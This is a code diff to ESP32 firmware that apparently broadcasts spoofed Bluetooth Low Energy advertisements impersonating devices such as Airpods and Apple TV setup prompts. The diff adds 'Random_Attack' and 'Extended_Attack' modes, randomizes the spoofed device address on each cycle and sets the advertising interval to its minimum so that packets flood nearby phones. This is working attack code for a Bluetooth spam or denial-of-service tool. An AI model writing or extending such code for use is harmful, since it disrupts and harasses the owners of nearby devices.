@@ -240,6 +240,12 @@ void selectDevice(int selectedPacket) {
     case 28:
       TV_Color_Balance();
       break;
+    case 29:
+      Random_Attack();
+      break;
+    case 30:
+      Extended_Attack();
+      break;
     default:
       // Handle the case when selectedPacket is out of range
       break;
@@ -249,28 +255,34 @@ void selectDevice(int selectedPacket) {
 void loop() {
   Buttons::updateButtons();
   if (lastPressedButton == 0) {
-    
     if (attack_state == 1){
     esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
     for (int i = 0; i < 6; i++){
       dummy_addr[i] = random(256);
+      if (i == 0){
+          dummy_addr[i] |= 0xF0;
+      }
     }
-
     selectDevice(selectedPacket);
     
     BLEAdvertisementData oAdvertisementData = getAdvertismentData();
 
     pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
     pAdvertising->setAdvertisementData(oAdvertisementData);
+
+    pAdvertising->setMinInterval(0x20);
+    pAdvertising->setMaxInterval(0x20);
+    pAdvertising->setMinPreferred(0x20);
+    pAdvertising->setMaxPreferred(0x20);
     
     pAdvertising->start();
     delay(delayMilliseconds); // delay for delayMilliseconds ms
     pAdvertising->stop();
+    }
   }
   else if (lastPressedButton == 1) {
     pAdvertising->stop();
   }
-}
 }
 
 void Airpods() {
@@ -443,5 +455,15 @@ void Transfer_Number() {
 void TV_Color_Balance() {
   device_choice = 1;
   device_index = 11;
+  attack_state = 1;
+}
+
+void Random_Attack(){
+  device_choice = 2;
+  attack_state = 1;
+}
+
+void Extended_Attack(){
+  device_choice = 3;
   attack_state = 1;
 }
